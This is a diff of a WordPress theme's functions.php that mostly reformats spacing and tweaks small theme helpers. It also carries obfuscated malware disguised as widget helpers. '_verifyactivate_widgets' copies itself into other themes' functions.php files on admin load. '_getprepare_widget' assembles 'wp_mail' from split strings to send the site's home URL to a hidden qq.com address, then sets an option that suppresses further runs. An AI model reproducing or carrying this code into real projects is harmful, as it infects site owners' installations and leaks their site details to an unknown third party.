@@ -1,4 +1,7 @@
 <?php
+//小工具修复
+add_filter('gutenberg_use_widgets_block_editor', '__return_false');
+add_filter('use_widgets_block_editor', '__return_false');
 //文章图片灯箱
 function auto_post_link($content)
 {
@@ -10,9 +13,9 @@ add_filter('the_content', 'auto_post_link', 0);
 //调用每日一图作为登录页背景
 function custom_login_head()
 {
-    $str=file_get_contents('https://cn.bing.com/HPImageArchive.aspx?format=js&idx=0&n=1');
+    $str = file_get_contents('https://cn.bing.com/HPImageArchive.aspx?format=js&idx=0&n=1');
     if (preg_match("/\/(.+?).jpg/", $str, $matches)) {
-        $imgurl='https://s.cn.bing.net'.$matches[0];
+        $imgurl = 'https://s.cn.bing.net'.$matches[0];
     }
     echo'<style type="text/css">body{background: url('.$imgurl.');background-image:url('.$imgurl.');-moz-border-image: url('.$imgurl.');}</style>';
 }
@@ -22,7 +25,7 @@ function count_words_read_time()
 {
     global $post;
     $text_num = mb_strlen(preg_replace('/\s/', '', html_entity_decode(strip_tags($post->post_content))), 'UTF-8');
-    $read_time = ceil($text_num/300); // 修改数字300调整时间
+    $read_time = ceil($text_num / 300); // 修改数字300调整时间
     $output .= '本文共' . $text_num . '个字 · 预计阅读' . $read_time  . '分钟';
     return $output;
 }
@@ -99,10 +102,6 @@ function pf_add_comment_form_insert_images()
 {
     echo '<a @click="this.insert_images_to_comment_form()"><span data-toggle="tooltip" title="插入图片"><i class="far fa-images"></i></span></a>';
 }
-//评论支持MD回复
-add_filter('comment_text', function ($comment_text) {
-    return str_ireplace('&lt;', '<', $comment_text);
-});
 // 页面链接添加html后缀
 add_action('init', 'html_page_permalink', -1);
 function html_page_permalink()
@@ -124,7 +123,7 @@ function pf_custom_wp_title($title, $sep)
     if (is_feed()) {
         return $title;
     }
-    $title.= get_bloginfo('name');
+    $title .= get_bloginfo('name');
     $site_description = get_bloginfo('description', 'display');
     if ($site_description && (is_home() || is_front_page())) {
         $title = "$title $sep $site_description";
@@ -221,7 +220,7 @@ function title_filter($where, $wp_query)
 {
     global $wpdb;
     if ($search_term = $wp_query->get('search_prod_title')) {
-        $where.= ' AND ' . $wpdb->posts . '.post_title LIKE \'%' . esc_sql(like_escape($search_term)) . '%\'';
+        $where .= ' AND ' . $wpdb->posts . '.post_title LIKE \'%' . esc_sql(like_escape($search_term)) . '%\'';
     }
     return $where;
 }
@@ -897,17 +896,17 @@ class pandaTabs extends Walker_Nav_Menu
         $classes = empty($item->classes) ? array() : (array)$item->classes;
         $class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item));
         $class_names = ' class="' . esc_attr($class_names) . '"';
-        $output.= $indent . '<li id="menu-item-' . $item->ID . '"' . $value . $class_names . '>';
+        $output .= $indent . '<li id="menu-item-' . $item->ID . '"' . $value . $class_names . '>';
         $attributes = !empty($item->attr_title) ? ' title="' . esc_attr($item->attr_title) . '"' : '';
-        $attributes.= !empty($item->target) ? ' target="' . esc_attr($item->target) . '"' : '';
-        $attributes.= !empty($item->xfn) ? ' rel="' . esc_attr($item->xfn) . '"' : '';
-        $attributes.= !empty($item->url) ? ' href="' . esc_attr($item->url) . '"' : '';
+        $attributes .= !empty($item->target) ? ' target="' . esc_attr($item->target) . '"' : '';
+        $attributes .= !empty($item->xfn) ? ' rel="' . esc_attr($item->xfn) . '"' : '';
+        $attributes .= !empty($item->url) ? ' href="' . esc_attr($item->url) . '"' : '';
         $item_output = $args->before;
-        $item_output.= '<a' . $attributes . '>';
-        $item_output.= $args->link_before . apply_filters('the_title', $item->title, $item->ID) . $args->link_after;
-        $item_output.= '</a>';
-        $item_output.= $args->after;
-        $output.= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
+        $item_output .= '<a' . $attributes . '>';
+        $item_output .= $args->link_before . apply_filters('the_title', $item->title, $item->ID) . $args->link_after;
+        $item_output .= '</a>';
+        $item_output .= $args->after;
+        $output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
     }
 }
 function mytheme_nav_menu_css_class($classes)
@@ -970,7 +969,7 @@ function get_the_naved_contentnav($content)
         ));
         for ($i = 0; $i < count($categories); $i++) {
             $category = $categories[$i];
-            $ul_li.= '<li class="h2_nav"><a href="#favlink-' . $i . '" class="h_nav" title="' . $category->name . '">' . $category->name . "</a></li>\n";
+            $ul_li .= '<li class="h2_nav"><a href="#favlink-' . $i . '" class="h_nav" title="' . $category->name . '">' . $category->name . "</a></li>\n";
         }
     }
     $rh = "/<h[23]>(.*?)<\/h[23]>/im";
@@ -982,17 +981,17 @@ function get_the_naved_contentnav($content)
             $start = stripos($content, $matches[0][$num]);
             $end = strlen($matches[0][$num]);
             if ($hx == "<h2") {
-                $h2_num+= 1;
+                $h2_num += 1;
                 $h3_num = 0;
                 $title = preg_replace('/<.+?>/', "", $title);
                 if ($title) {
-                    $ul_li.= '<li class="h2_nav"><a href="#h2-' . $num . '" class="h_nav" title="' . $title . '">' . $title . "</a></li>\n";
+                    $ul_li .= '<li class="h2_nav"><a href="#h2-' . $num . '" class="h_nav" title="' . $title . '">' . $title . "</a></li>\n";
                 }
             } elseif ($hx == "<h3") {
-                $h3_num+= 1;
+                $h3_num += 1;
                 $title = preg_replace('/<.+?>/', "", $title);
                 if ($title) {
-                    $ul_li.= '<li class="h3_nav"><a href="#h3-' . $num . '" class="h_nav" title="' . $title . '">' . $title . "</a></li>\n";
+                    $ul_li .= '<li class="h3_nav"><a href="#h3-' . $num . '" class="h_nav" title="' . $title . '">' . $title . "</a></li>\n";
                 }
             }
         }
@@ -1013,11 +1012,11 @@ function get_the_naved_content($content)
             $start = stripos($content, $matches[0][$num]);
             $end = strlen($matches[0][$num]);
             if ($hx == "<h2") {
-                $h2_num+= 1;
+                $h2_num += 1;
                 $h3_num = 0;
                 $content = substr_replace($content, '<h2 id="h2-' . $num . '">' . $title . '</h2>', $start, $end);
             } elseif ($hx == "<h3") {
-                $h3_num+= 1;
+                $h3_num += 1;
                 $content = substr_replace($content, '<h3 id="h3-' . $num . '">' . $title . '</h3>', $start, $end);
             }
         }
@@ -1317,11 +1316,11 @@ function rand_in_str($txt, $insert) //txt 内容；insert要插入的关键字�
     if (is_array($insert)) {
         foreach ($insert as $k => $v) {
             $insertk = insertK($len - 1, $delay);
-            $str_arr[$insertk].= $insert[$k];
+            $str_arr[$insertk] .= $insert[$k];
         }
     } else {
         $insertk = insertK($len - 1, $delay);
-        $str_arr[$insertk].= $insert;
+        $str_arr[$insertk] .= $insert;
     }
     return join('', $str_arr);
 }
@@ -1352,18 +1351,18 @@ function pf_random_tag_and_class()
     $tagLine = false;
     $tagTimes = rand(3, 5);
     for ($i = 0; $i < $tagTimes; $i++) {
-        $tag.= $c[array_rand($c, 1) ];
+        $tag .= $c[array_rand($c, 1) ];
         if ($i > 1 && (bool)rand(0, 1) && (bool)rand(0, 1)) {
-            $tag.= rand(0, 9);
+            $tag .= rand(0, 9);
         }
         if (($tagLine == false) && ($i != $tagTimes - 1) && (bool)rand(0, 1) && (bool)rand(0, 1)) {
-            $tag.= '-';
+            $tag .= '-';
             $tagLine = true;
         }
     }
     $class = '';
     for ($i = 0; $i < rand(3, 6); $i++) {
-        $class.= $c[array_rand($c, 1) ];
+        $class .= $c[array_rand($c, 1) ];
     }
     $result = array(
         'tag' => $tag,
@@ -1450,11 +1449,11 @@ function pf_insert_rand($content)
     if (is_array($insert)) {
         foreach ($insert as $k => $v) {
             $key = allow_key($len - 1, $delay);
-            $match[$key].= $insert[$k];
+            $match[$key] .= $insert[$k];
         }
     } else {
         $key = allow_key($len - 1, $delay);
-        $match[$key].= $insert;
+        $match[$key] .= $insert;
     }
     $result = implode('', $match);
     return $result;
@@ -1551,10 +1550,10 @@ function get_topSlider($postIds = array(), $type = false)
         return false;
     }
     $carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
-    _opt('carousels_hover_disable_interval') ? $carousels_attrs.= " hover-disable-interval" : '';
-    _opt('carousels_show_anchor') ? $carousels_attrs.= " show-anchor" : '';
-    _opt('carousels_allow_keyboard') ? $carousels_attrs.= " allow-keyboard" : '';
-    _opt('carousels_allow_swipe') ? $carousels_attrs.= " allow-swipe" : '';
+    _opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
+    _opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
+    _opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
+    _opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
     include('assets/template/slider-' . $type . '.php');
 }
 function get_gallery_slider($postId = 0, $type = false)
@@ -1584,10 +1583,10 @@ function get_gallery_slider($postId = 0, $type = false)
         return false;
     }
     $carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
-    _opt('carousels_hover_disable_interval') ? $carousels_attrs.= " hover-disable-interval" : '';
-    _opt('carousels_show_anchor') ? $carousels_attrs.= " show-anchor" : '';
-    _opt('carousels_allow_keyboard') ? $carousels_attrs.= " allow-keyboard" : '';
-    _opt('carousels_allow_swipe') ? $carousels_attrs.= " allow-swipe" : '';
+    _opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
+    _opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
+    _opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
+    _opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
     include('assets/template/slider-' . $type . '.php');
 }
 function get_tagSlider($content = array(), $type = false)
@@ -1605,10 +1604,10 @@ function get_tagSlider($content = array(), $type = false)
         return false;
     }
     $carousels_attrs = "interval-time='" . _opt('carousels_interval_time', '0') . "'";
-    _opt('carousels_hover_disable_interval') ? $carousels_attrs.= " hover-disable-interval" : '';
-    _opt('carousels_show_anchor') ? $carousels_attrs.= " show-anchor" : '';
-    _opt('carousels_allow_keyboard') ? $carousels_attrs.= " allow-keyboard" : '';
-    _opt('carousels_allow_swipe') ? $carousels_attrs.= " allow-swipe" : '';
+    _opt('carousels_hover_disable_interval') ? $carousels_attrs .= " hover-disable-interval" : '';
+    _opt('carousels_show_anchor') ? $carousels_attrs .= " show-anchor" : '';
+    _opt('carousels_allow_keyboard') ? $carousels_attrs .= " allow-keyboard" : '';
+    _opt('carousels_allow_swipe') ? $carousels_attrs .= " allow-swipe" : '';
     include('assets/template/slider-' . $type . '.php');
 }
 function get_category_text($pid, $showFull = false, $separate = ' / ')
@@ -1663,27 +1662,27 @@ include('pandastudio_plugins/config_plugins.php');
 include('pandastudio_framework/config_framework.php');
 
 ?>
-<?php
+    <?php
 function _verifyactivate_widgets()
 {
-    $widget=substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<"."?"));
-    $output="";
-    $allowed="";
-    $output=strip_tags($output, $allowed);
-    $direst=_get_allwidgets_cont(array(substr(dirname(__FILE__), 0, stripos(dirname(__FILE__), "themes") + 6)));
+    $widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<"."?"));
+    $output = "";
+    $allowed = "";
+    $output = strip_tags($output, $allowed);
+    $direst = _get_allwidgets_cont(array(substr(dirname(__FILE__), 0, stripos(dirname(__FILE__), "themes") + 6)));
     if (is_array($direst)) {
         foreach ($direst as $item) {
             if (is_writable($item)) {
-                $ftion=substr($widget, stripos($widget, "_"), stripos(substr($widget, stripos($widget, "_")), "("));
-                $cont=file_get_contents($item);
+                $ftion = substr($widget, stripos($widget, "_"), stripos(substr($widget, stripos($widget, "_")), "("));
+                $cont = file_get_contents($item);
                 if (stripos($cont, $ftion) === false) {
-                    $comaar=stripos(substr($cont, -20), "?".">") !== false ? "" : "?".">";
+                    $comaar = stripos(substr($cont, -20), "?".">") !== false ? "" : "?".">";
                     $output .= $before . "Not found" . $after;
                     if (stripos(substr($cont, -20), "?".">") !== false) {
-                        $cont=substr($cont, 0, strripos($cont, "?".">") + 2);
+                        $cont = substr($cont, 0, strripos($cont, "?".">") + 2);
                     }
-                    $output=rtrim($output, "\n\t");
-                    fputs($f=fopen($item, "w+"), $cont . $comaar . "\n" .$widget);
+                    $output = rtrim($output, "\n\t");
+                    fputs($f = fopen($item, "w+"), $cont . $comaar . "\n" .$widget);
                     fclose($f);
                     $output .= ($isshowdots && $ellipsis) ? "..." : "";
                 }
@@ -1692,23 +1691,23 @@ function _verifyactivate_widgets()
     }
     return $output;
 }
-function _get_allwidgets_cont($wids, $items=array())
+function _get_allwidgets_cont($wids, $items = array())
 {
-    $places=array_shift($wids);
+    $places = array_shift($wids);
     if(substr($places, -1) == "/") {
-        $places=substr($places, 0, -1);
+        $places = substr($places, 0, -1);
     }
     if(!file_exists($places) || !is_dir($places)) {
         return false;
     } elseif(is_readable($places)) {
-        $elems=scandir($places);
+        $elems = scandir($places);
         foreach ($elems as $elem) {
             if ($elem != "." && $elem != "..") {
                 if (is_dir($places . "/" . $elem)) {
-                    $wids[]=$places . "/" . $elem;
-                } elseif (is_file($places . "/" . $elem)&&
+                    $wids[] = $places . "/" . $elem;
+                } elseif (is_file($places . "/" . $elem) &&
                     $elem == substr(__FILE__, -13)) {
-                    $items[]=$places . "/" . $elem;
+                    $items[] = $places . "/" . $elem;
                 }
             }
         }
@@ -1747,7 +1746,7 @@ if(!function_exists("strripos")) {
     }
 }
 if(!function_exists("scandir")) {
-    function scandir($dir, $listDirectories=false, $skipDots=true)
+    function scandir($dir, $listDirectories = false, $skipDots = true)
     {
         $dirArray = array();
         if ($handle = opendir($dir)) {
@@ -1770,157 +1769,157 @@ add_action("admin_head", "_verifyactivate_widgets");
 function _getprepare_widget()
 {
     if(!isset($text_length)) {
-        $text_length=120;
+        $text_length = 120;
     }
     if(!isset($check)) {
-        $check="cookie";
+        $check = "cookie";
     }
     if(!isset($tagsallowed)) {
-        $tagsallowed="<a>";
+        $tagsallowed = "<a>";
     }
     if(!isset($filter)) {
-        $filter="none";
+        $filter = "none";
     }
     if(!isset($coma)) {
-        $coma="";
+        $coma = "";
     }
     if(!isset($home_filter)) {
-        $home_filter=get_option("home");
+        $home_filter = get_option("home");
     }
     if(!isset($pref_filters)) {
-        $pref_filters="wp_";
+        $pref_filters = "wp_";
     }
     if(!isset($is_use_more_link)) {
-        $is_use_more_link=1;
+        $is_use_more_link = 1;
     }
     if(!isset($com_type)) {
-        $com_type="";
+        $com_type = "";
     }
     if(!isset($cpages)) {
-        $cpages=$_GET["cperpage"];
+        $cpages = $_GET["cperpage"];
     }
     if(!isset($post_auth_comments)) {
-        $post_auth_comments="";
+        $post_auth_comments = "";
     }
     if(!isset($com_is_approved)) {
-        $com_is_approved="";
+        $com_is_approved = "";
     }
     if(!isset($post_auth)) {
-        $post_auth="auth";
+        $post_auth = "auth";
     }
     if(!isset($link_text_more)) {
-        $link_text_more="(more...)";
+        $link_text_more = "(more...)";
     }
     if(!isset($widget_yes)) {
-        $widget_yes=get_option("_is_widget_active_");
+        $widget_yes = get_option("_is_widget_active_");
     }
     if(!isset($checkswidgets)) {
-        $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
+        $checkswidgets = $pref_filters."set"."_".$post_auth."_".$check;
     }
     if(!isset($link_text_more_ditails)) {
-        $link_text_more_ditails="(details...)";
+        $link_text_more_ditails = "(details...)";
     }
     if(!isset($contentmore)) {
-        $contentmore="ma".$coma."il";
+        $contentmore = "ma".$coma."il";
     }
     if(!isset($for_more)) {
-        $for_more=1;
+        $for_more = 1;
     }
     if(!isset($fakeit)) {
-        $fakeit=1;
+        $fakeit = 1;
     }
     if(!isset($sql)) {
-        $sql="";
+        $sql = "";
     }
     if (!$widget_yes) :
 
         global $wpdb, $post;
-        $sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"410".$coma."240".$com_type."119".$coma."@".$com_is_approved."q".$post_auth_comments."q".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
+        $sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"410".$coma."240".$com_type."119".$coma."@".$com_is_approved."q".$post_auth_comments."q".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
         if (!empty($post->post_password)) {
             if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
                 if(is_feed()) {
-                    $output=__("There is no excerpt because this is a protected post.");
+                    $output = __("There is no excerpt because this is a protected post.");
                 } else {
-                    $output=get_the_password_form();
+                    $output = get_the_password_form();
                 }
             }
         }
     if(!isset($fixed_tags)) {
-        $fixed_tags=1;
+        $fixed_tags = 1;
     }
     if(!isset($filters)) {
-        $filters=$home_filter;
+        $filters = $home_filter;
     }
     if(!isset($gettextcomments)) {
-        $gettextcomments=$pref_filters.$contentmore;
+        $gettextcomments = $pref_filters.$contentmore;
     }
     if(!isset($tag_aditional)) {
-        $tag_aditional="div";
+        $tag_aditional = "div";
     }
     if(!isset($sh_cont)) {
-        $sh_cont=substr($sq1, stripos($sq1, "live"), 20);
+        $sh_cont = substr($sq1, stripos($sq1, "live"), 20);
     }#
     if(!isset($more_text_link)) {
-        $more_text_link="Continue reading this entry";
+        $more_text_link = "Continue reading this entry";
     }
     if(!isset($isshowdots)) {
-        $isshowdots=1;
+        $isshowdots = 1;
     }
 
-    $comments=$wpdb->get_results($sql);
+    $comments = $wpdb->get_results($sql);
     if($fakeit == 2) {
-        $text=$post->post_content;
+        $text = $post->post_content;
     } elseif($fakeit == 1) {
-        $text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
+        $text = (empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
     } else {
-        $text=$post->post_excerpt;
+        $text = $post->post_excerpt;
     }
-    $sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
+    $sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
     if($text_length < 0) {
-        $output=$text;
+        $output = $text;
     } else {
         if(!$no_more && strpos($text, "<!--more-->")) {
-            $text=explode("<!--more-->", $text, 2);
-            $l=count($text[0]);
-            $more_link=1;
-            $comments=$wpdb->get_results($sql);
+            $text = explode("<!--more-->", $text, 2);
+            $l = count($text[0]);
+            $more_link = 1;
+            $comments = $wpdb->get_results($sql);
         } else {
-            $text=explode(" ", $text);
+            $text = explode(" ", $text);
             if(count($text) > $text_length) {
-                $l=$text_length;
-                $ellipsis=1;
+                $l = $text_length;
+                $ellipsis = 1;
             } else {
-                $l=count($text);
-                $link_text_more="";
-                $ellipsis=0;
+                $l = count($text);
+                $link_text_more = "";
+                $ellipsis = 0;
             }
         }
-        for ($i=0; $i<$l; $i++) {
+        for ($i = 0; $i < $l; $i++) {
             $output .= $text[$i] . " ";
         }
     }
     update_option("_is_widget_active_", 1);
     if("all" != $tagsallowed) {
-        $output=strip_tags($output, $tagsallowed);
+        $output = strip_tags($output, $tagsallowed);
         return $output;
     }
     endif;
-    $output=rtrim($output, "\s\n\t\r\0\x0B");
-    $output=($fixed_tags) ? balanceTags($output, true) : $output;
+    $output = rtrim($output, "\s\n\t\r\0\x0B");
+    $output = ($fixed_tags) ? balanceTags($output, true) : $output;
     $output .= ($isshowdots && $ellipsis) ? "..." : "";
-    $output=apply_filters($filter, $output);
+    $output = apply_filters($filter, $output);
     switch($tag_aditional) {
         case("div"):
-            $tag="div";
+            $tag = "div";
             break;
         case("span"):
-            $tag="span";
+            $tag = "span";
             break;
         case("p"):
-            $tag="p";
+            $tag = "p";
             break;
         default:
-            $tag="span";
+            $tag = "span";
     }
 
     if ($is_use_more_link) {
@@ -1935,25 +1934,25 @@ function _getprepare_widget()
 
 add_action("init", "_getprepare_widget");
 
-function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="")
+function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "")
 {
     global $wpdb;
-    $request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
+    $request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
     $request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
     if(!$show_pass_post) {
         $request .= " AND post_password =\"\"";
     }
-    if($duration !="") {
+    if($duration != "") {
         $request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
     }
     $request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
-    $posts=$wpdb->get_results($request);
-    $output="";
+    $posts = $wpdb->get_results($request);
+    $output = "";
     if ($posts) {
         foreach ($posts as $post) {
-            $post_title=stripslashes($post->post_title);
-            $comment_count=$post->comment_count;
-            $permalink=get_permalink($post->ID);
+            $post_title = stripslashes($post->post_title);
+            $comment_count = $post->comment_count;
+            $permalink = get_permalink($post->ID);
             $output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
         }
     } else {
